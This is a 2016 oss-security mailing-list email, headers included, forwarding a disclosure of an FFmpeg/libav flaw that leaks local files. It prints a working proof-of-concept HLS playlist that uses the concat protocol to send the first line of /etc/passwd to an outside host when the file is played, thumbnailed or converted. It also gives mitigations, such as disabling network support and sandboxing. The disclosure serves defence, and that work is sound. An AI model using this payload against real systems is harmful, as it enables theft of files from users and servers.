X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1669" "Wednesday" "13" "January" "2016" "14:01:55" "+0300" "Vladimir Dubrovin" "vlad@securityvulns.ru" "<56962EA3.5000108@securityvulns.ru>" "53" "[oss-security] Fwd: FFmpeg: stealing local files with HLS+concat" nil nil nil "1" "2016011311:01:55" "[oss-security] Fwd: FFmpeg: stealing local files with HLS+concat" (number mark "U       vlad@securit Jan 13   53/1669  " thread-indent "\"[oss-security] Fwd: FFmpeg: stealing local files with HLS+concat\"\n") "<CAHa1V14Rc+vtuPPiT_rQzzg7v8Amye=Fg6koysmmV7WFuVLeCg@mail.gmail.com>" ("<CAHa1V14Rc+vtuPPiT_rQzzg7v8Amye=Fg6koysmmV7WFuVLeCg@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 23594 invoked by uid 550); 13 Jan 2016 11:02:23 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 22472 invoked from network); 13 Jan 2016 11:02:07 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=securityvulns.ru; s=mail;
	t=1452682915; bh=Qeq0BgclTkdSOIoNS0vJ3EqfDgxwjE2db5ev1F9m/pU=;
	h=Subject:References:To:From:X-Forwarded-Message-Id:Message-ID:Date:
	 User-Agent:MIME-Version:In-Reply-To:Content-Type:
	 Content-Transfer-Encoding;
	b=aMrAWiZKpB4aTFD/cbRlRzW63qcInEW5rudP/213JMPejpCT+xYDpG9H6iX/Q1Grx
	 e1Cvv3vqqCLjWlXEvQyzGsGtic8NUdlnPG/0lbrDReBryJrSLiU0IY4ij9VwHAJfnT
	 pGRvSiLbZ1lsnmZsqJ1AxdS18zFmcW2WVH7cJAkw=
Authentication-Results: smtp17.mail.yandex.net; dkim=pass header.i=@securityvulns.ru
References: <CAHa1V14Rc+vtuPPiT_rQzzg7v8Amye=Fg6koysmmV7WFuVLeCg@mail.gmail.com>
To: oss-security@lists.openwall.com
From: Vladimir Dubrovin <vlad@securityvulns.ru>
X-Forwarded-Message-Id: <CAHa1V14Rc+vtuPPiT_rQzzg7v8Amye=Fg6koysmmV7WFuVLeCg@mail.gmail.com>
Message-ID: <56962EA3.5000108@securityvulns.ru>
Date: Wed, 13 Jan 2016 14:01:55 +0300
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101
 Firefox/42.0 SeaMonkey/2.39
MIME-Version: 1.0
In-Reply-To: <CAHa1V14Rc+vtuPPiT_rQzzg7v8Amye=Fg6koysmmV7WFuVLeCg@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
Subject: [oss-security] Fwd: FFmpeg: stealing local files with HLS+concat


---------- Forwarded message ----------
From: Максим Андреев <andreevmaxim@gmail.com>
Date: 13 January 2016 at 13:41
Subject: FFmpeg: stealing local files with HLS+concat
To: oss-security@lists.openwall.com


Hello!
I found some strange behavior in ffmpeg which can lead to stealing local
files during ffmpeg/ffprobe exec, it's also applied to libav.

I've underestimated the impact of this bug, so it was full disclosured
in this article (Russian language, but google translate works fine with
it) - http://habrahabr.ru/company/mailru/blog/274855


In short:
if linux user download specially prepared video file (with any
extension: avi/mov/etc..) which contains HLS m3u8 playlist with "concat"
protocol in url:,
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://dx.su/header.m3u8|file:///etc/passwd
#EXT-X-ENDLIST

header.m3u8:
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
http://example.org?

If user launches ffmpeg-based video player (MPlayer, etc..), first line
of /etc/passwd will be sent to http://example.org? in
http://example.org?# $FreeBSD: release/100.0/et..  request.
The same happens when file manager tries to generate thumbnail for this
file.

All this can be applied to server-run ffmpeg during video conversion.
FFmpeg/libav security teams are already notified, but official patches
are not available yet, so you can rebuild ffmpeg with --disable-network
configure option which prevents this vulnerability from being exploited.

Moreover, it's always recommended to run ffmpeg in isolated environment
when processing untrusted files
(googleonlinesecurity.blogspot.ru/2014/01/ffmpeg-and-thousand-fixes.html)

-- 
Maxim Andreev



